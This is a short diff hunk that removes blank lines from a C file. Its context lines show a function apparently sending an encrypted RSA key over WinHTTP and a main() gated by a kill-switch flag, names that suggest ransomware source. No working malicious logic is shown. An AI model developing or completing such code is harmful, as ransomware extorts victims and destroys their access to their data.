@@ -334,9 +334,6 @@ void send_rsa_key_info(const BYTE *encrypted_key, DWORD encrypted_len) {
     WinHttpCloseHandle(hSession);
 }
 
-
-
-
 int main() {
     if (ACTIVATE_KILLSWITCH) {
         srand((unsigned int)time(NULL));
